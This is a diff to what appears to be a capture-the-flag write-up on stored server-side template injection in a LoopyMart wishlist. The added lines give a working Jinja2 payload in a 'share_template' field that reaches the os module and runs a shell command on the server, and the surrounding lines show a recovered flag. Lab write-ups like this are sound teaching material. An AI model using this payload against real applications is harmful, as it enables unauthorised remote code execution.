@@ -99,6 +99,11 @@ The wishlist **name** is also rendered through Jinja2 and appears in the
 
 3. The rendered flag appears in the <title> of the response HTML:
    <title>CTF{t3mpl4t3_1nj3ct10n_ftw} – LoopyMart Wishlist</title>
+
+4. RCE 
+{
+  "share_template": "{{ lipsum.__globals__['os'].popen('id').read() }}"
+}
 ```
 
 This is a **second-order / stored SSTI**: the payload is persisted in the
